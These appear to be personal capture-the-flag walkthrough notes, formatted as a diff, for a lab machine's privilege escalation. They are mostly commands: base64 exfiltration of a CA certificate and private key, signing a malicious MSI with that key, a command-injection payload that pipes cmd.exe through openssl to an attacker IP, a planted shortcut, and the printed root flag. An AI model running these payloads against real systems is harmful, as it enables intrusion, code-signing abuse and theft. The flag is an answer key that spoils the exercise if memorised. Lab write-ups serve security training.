@@ -1,0 +1,95 @@
+#10.10.10.106
+--------------
+#Inside two terminal
+#run cmd into terminal(port 73) & get output inside terminal(port 136)
+#serach files on server
+dir D:\
+
+#found one file  'D:\DEV\MSIs\note.txt'
+```Please drop MSIs that need testing into this folder - I will review regularly. Certs have been added to the store already.
+- Rupal ```
+
+#found certificates also inside D:\Certs
+dir D:\Certs
+
+#to download certificates first encode as base64 then copy output and decode again with base64
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in D:\Certs\MyCA.cer
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in D:\Certs\MyCA.pvk
+
+#copy there output into one 'file' and decode them with base64
+base64 -d file > MyCA.cer
+base64 -d file > MyCA.pvk
+
+-------------------------------------------------
+#INSIDE WINDOWS CMD PROMPT
+-------------------------------------------------
+#transfer files & tools to windows pc (file.xml, wixtookset, signintool)
+
+#used xml code to create .msi file
+>>>https://blog.xpnsec.com/becoming-system/
+#do change in the code, see ipsec ethereal video (at 1:35h)
+	OR
+#check 'file.xml' for code   (used)
+#update ip add inside 'file.xml' file
+#to convert .xml file into msi file used wixtool
+>>>http://wixtoolset.org/releases/ 
+#download 'wix311-binaries.zip'
+
+#use windows cmd
+#first use candle.exe to convert .xml to .wixobj
+candle.exe -out file.wixobj 'file.xml'
+
+#now convert file.wixobj to file.msi
+light.exe -out file.msi file.wixobj
+
+#now time to signing 'file.msi' file with those certificate
+
+makecert.exe -n "CN=Ethereal" -pe -cy end -ic MyCA.cer -iv MyCA.pvk -sky signature -sv MyOwnCA.pvk MyOwnCA.cer
+pvk2pfx.exe -pvk MyOwnCA.pvk -spc MyOwnCA.cer -pfx MyOwnCA.pfx
+signtool.exe sign /f MyOwnCA.pfx file.msi
+signtool.exe verify /pa file.msi		(ignore error)
+
+#finally got the malicious signed 'file.msi' file 
+
+---------------------------------------------------
+#BACK TO LINUX
+---------------------------------------------------
+#transfer all required files(file.msi) & tools to linux
+
+#upload 'file.msi' onto server
+
+#on 1st terminal
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+#on 2nd terminal
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136 < "file.msi"
+#run this on webpage to store 'file.msi' into "c:\windows\tracing\" folder so that i can use it later on
+127.0.0.1|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:136>"c:\windows\tracing\file.msi"
+
+#when file transfer is complete then quit from both terminal and again connect to 'jorge' user
+#on 1st terminal
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+#on 2nd terminal
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136 < "Visual Studio 2017.lnk"
+#run this on webpage
+127.0.0.1|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:136>"c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk"
+
+#after transfer is done wait for connection
+#after cmd is executed stop the both terminal and execute these cmd again on different terminal 
+#and wait for some time
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+
+#now copy 'file.msi' to "D:\DEV\MSIs" folder
+copy c:\windows\tracing\file.msi D:\DEV\MSIs
+
+#again exit from terminal & run those cmd again and wait for connection from 'Rupal'
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+
+#Got shell as 'Rupal'
+type c:\users\rupal\desktop\root.txt
+
+
+#key
+1cb6f1fc220e3f2fcc0e3cd8e2d9906f
+
